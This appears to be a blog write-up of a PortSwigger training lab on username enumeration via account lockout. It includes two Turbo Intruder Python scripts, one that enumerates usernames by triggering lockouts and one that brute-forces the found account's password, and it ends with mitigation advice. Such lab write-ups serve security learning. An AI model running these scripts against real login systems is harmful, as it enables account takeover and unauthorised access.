---
layout: post
title: "PortSwigger Lab: Username enumeration via account lock"
date: 2025-08-03
categories: ["PortSwigger", "Authentication Vulnerabilities"]
tags:
  [
    "PortSwigger",
    "Authentication Vulnerabilities",
    "Vulnerabilities in password-based login",
    "Username Enumeration",
    "Bruteforce",
    "Turbo Intruder",
    "Burp Suite",
  ]
---

## PortSwigger Lab: Username enumeration via account lock

## Table of Contents

- [Overview / Goal](#overview--goal)
- [Lab Setup and Tools](#lab-setup-and-tools)
- [What's the Login Info?](#whats-the-login-info)
  - [Solution Steps](#solution-steps)
- [Key Takeaways](#key-takeaways)
- [What I'd Do Next](#what-id-do-next)

---

## Overview / Goal

The goal: Enumerate a valid username, brute-force this user's password, then access their account page.

This lab focuses on **account lock behaviour**. The web app only locks real accounts after a certain number of failed attempts. Fake usernames never get locked.

Wordlists provided by PortSwigger:

- https://portswigger.net/web-security/authentication/auth-lab-usernames
- https://portswigger.net/web-security/authentication/auth-lab-passwords

---

## Lab Setup and Tools

- Burp Suite + Firefox (through FoxyProxy)
- Turbo Intruder extension

---

## What's the Login Info?

### Solution Steps

I started by sending a basic login request using fake credentials:
`FAKE:FAKE`

I repeated the login attempt several times to see how the application reacted. Nothing changed... the response always said

```text
"Invalid username or password."
```

That told me something important.

If the application locks accounts only when the username is valid, then brute-forcing usernames should reveal which one behaves differently.

### Step 1: Username Enumeration via Account Lock

I sent the request to Turbo Intruder and set it up so that:

- The username comes from the provided wordlist
- The password stays static (`FAKE`)
- Each username is attempted multiple times to trigger a lock if it exists

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(
        endpoint=target.endpoint,
        concurrentConnections=5,
        requestsPerConnection=100,
        pipeline=False,
        engine=Engine.THREADED
    )
    for username in open('/home/kali/un'):
        username = username.rstrip()
        for _ in range(5):
            engine.queue(target.req, username)
def handleResponse(req, interesting):
    table.add(req)
```

Every username returned the same response length **except one**.

All responses were length **3284**, except one that returned **3337**.

That username was:

**Username:** `auction` ✅

So now we know the valid account.

---

### Step 2: Brute-Forcing the Password

Next, I reused the request but this time fixed the username and brute-forced the password list.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    for password in open('/home/kali/pw'):
        engine.queue(target.req, password.rstrip())

def handleResponse(req, interesting):
    if req.status != 404:
        table.add(req)
```

All responses looked identical except for one that did **not** return an error.

That password was:

**Password:** `555555` ✅

I waited for the account lock timer to reset, logged in with:

`auction:555555`

and the lab was solved!

---

## Key Takeaways

Account lock mechanisms can leak information. If an application only locks real users, then the lock itself becomes a vulnerability for username enumeration.

---

## What I'd Do Next

To prevent this:

- Apply identical lockout behaviour for all usernames
- Avoid revealing different responses for valid vs invalid accounts
- Rate-limit at the IP + account level
- Consider introducing uniform delays across all login attempts
